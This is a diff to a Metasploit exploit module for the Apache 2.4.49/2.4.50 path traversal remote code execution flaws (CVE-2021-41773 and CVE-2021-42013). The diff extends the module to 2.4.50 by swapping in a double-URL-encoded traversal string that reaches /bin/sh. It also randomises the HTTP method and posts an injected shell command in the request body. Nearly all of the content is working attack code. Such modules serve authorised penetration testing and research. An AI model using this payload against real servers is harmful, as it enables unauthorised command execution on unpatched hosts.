@@ -15,14 +15,16 @@ class MetasploitModule < Msf::Exploit::Remote
     super(
       update_info(
         info,
-        'Name' => 'Apache 2.4.49 Traversal RCE',
+        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE',
         'Description' => %q{
           This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
           If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
           it can be used to execute arbitrary commands (Remote Command Execution).
+          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
         },
         'References' => [
           ['CVE', '2021-41773'],
+          ['CVE', '2021-42013'],
           ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
           ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
         ],
@@ -37,7 +39,7 @@ class MetasploitModule < Msf::Exploit::Remote
         'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
         'DefaultOptions' => {
           'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',
-          'Action' => 'RCE',
+          'StartMode' => 'RCE',
           'RPORT' => 443,
           'SSL' => true
         },
@@ -87,11 +89,11 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(command, _opts = {})
-    traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
+    traversal = '%%32%65%%32%65/' * datastore['DEPTH'] << '/bin/sh'
 
     uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
     response = send_request_raw({
-      'method' => 'POST',
+      'method' => Rex::Text.rand_text_alpha(3..4),
       'uri' => uri,
       'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}"
     })
@@ -113,7 +115,7 @@ class MetasploitModule < Msf::Exploit::Remote
       fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
     end
 
-    print_status(message('Attempt to exploit for CVE-2021-41773'))
+    print_status(message('Attempt to exploit for CVE-2021-42013'))
     case target['Type']
     when :linux_dropper
 
